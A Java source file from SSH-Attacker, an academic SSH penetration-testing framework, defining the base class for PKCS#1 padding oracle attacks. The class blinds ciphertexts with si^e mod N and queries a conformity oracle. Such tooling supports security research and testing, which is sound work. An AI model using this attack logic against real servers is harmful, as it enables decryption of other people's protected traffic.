/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.util.ArrayConverter;
import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;

/** Base class for Pkcs1 attacks */
public class Pkcs1Attack {

    /** Initialize the log4j LOGGER. */
    private static final Logger LOGGER = LogManager.getLogger();

    protected final Pkcs1Oracle oracle;

    protected final byte[] encryptedMsg;

    protected final RSAPublicKey publicKey;

    protected BigInteger c0;

    protected final int blockSize;

    protected BigInteger solution;

    protected BigInteger bigB;

    /**
     * @param msg The message that should be decrypted with the attack
     * @param pkcsOracle The oracle to be queried
     */
    public Pkcs1Attack(byte[] msg, Pkcs1Oracle pkcsOracle) {
        super();
        encryptedMsg = msg.clone();
        publicKey = (RSAPublicKey) pkcsOracle.getPublicKey();
        oracle = pkcsOracle;
        c0 = BigInteger.ZERO;
        blockSize = oracle.getBlockSize();
    }

    /**
     * @param message original message to be changed
     * @param si factor
     * @return (m*si) mod N, or (m*si^e) mod N, depending on the oracle type, in a byte array
     */
    protected byte[] prepareMsg(BigInteger message, BigInteger si) {
        byte[] msg;
        BigInteger tmp = multiply(message, si);
        msg = ArrayConverter.bigIntegerToByteArray(tmp, blockSize, true);
        return msg;
    }

    /**
     * @param message original message to be changed
     * @param si factor
     * @return (m*si) mod N, or (m*si^e) mod N, depending on the oracle type
     */
    protected BigInteger multiply(BigInteger message, BigInteger si) {
        BigInteger tmp;
        // if we use a real oracle (not a plaintext oracle), the si value has
        // to be encrypted first.
        if (!oracle.isPlaintextOracle()) {
            // encrypt: si^e mod n
            tmp = si.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
        } else {
            tmp = si;
        }
        // blind: c0*(si^e) mod n
        // or: m*si mod n (in case of plaintext oracle)
        tmp = message.multiply(tmp);
        return tmp.mod(publicKey.getModulus());
    }

    /**
     * @param message Message to query the oracle with
     * @param si The si value to multiply the message with
     * @return The return value of the oracle (true/false)
     */
    protected boolean queryOracle(BigInteger message, BigInteger si) {
        byte[] msg = prepareMsg(message, si);
        LOGGER.info(ArrayConverter.bytesToHexString(msg));
        return oracle.checkPKCSConformity(msg);
    }

    /**
     * @param message Message to query the oracle with
     * @return The return value of the oracle (true/false)
     */
    protected boolean queryOracle(BigInteger message) {
        byte[] msg = ArrayConverter.bigIntegerToByteArray(message, blockSize, true);
        return oracle.checkPKCSConformity(msg);
    }

    public BigInteger getSolution() {
        return solution;
    }
}
